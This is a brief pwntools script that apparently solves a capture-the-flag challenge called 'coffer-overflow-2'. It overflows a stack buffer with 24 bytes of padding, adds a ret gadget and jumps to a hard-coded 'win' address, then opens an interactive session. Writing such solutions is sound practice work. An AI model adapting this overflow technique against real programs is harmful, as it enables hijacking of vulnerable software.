from pwn import *

io = process('./coffer-overflow-2')
win = 0x00000000004006e6
ret = 0x000000000040053e
payload = cyclic(24) + p64(ret) + p64(win)

io.sendline(payload)
io.interactive()
